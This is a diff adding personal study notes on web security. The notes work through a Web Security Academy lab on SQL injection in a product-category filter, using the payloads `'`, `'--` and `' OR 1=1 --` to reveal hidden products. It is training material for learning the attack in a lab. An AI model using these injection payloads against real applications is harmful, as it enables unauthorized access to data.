@@ -41,3 +41,42 @@ Arachni, Wapiti, Acunetix, W3af.
 ## Burp Suite Community Edition
 
 Proxy tab > Open Browser (built-in).
+
+### Lab 1. SQLi Vulnerability in WHERE clause allowing retrieval of hidden data
+
+- Product category filter
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+AND released = 1;
+```
+
+End goal: display all products both released and unreleased.
+
+Payload: `web-security-academy.net/filter?category=Gifts`
+
+### Submit various payloads and watch the behavior:
+
+1. ?category= `'`
+
+```sql
+SELECT * FROM products WHERE category = ''' AND released = 1
+-- Internal Server Error. This may indicate a SQL injection vulnerability
+```
+
+2. ?category= `'--`
+
+```sql
+SELECT * FROM products WHERE category = ''--' AND released = 1 ---> No web page error, good sign.
+```
+
+3. ?category= `' OR 1=1 --`  
+The first single quote (') acts as the closing quote in the
+SQL statement, whereas the `--` cancels out the
+`released = 1` validation-
+
+```sql
+SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1 
+```
+
+SUCCESS!
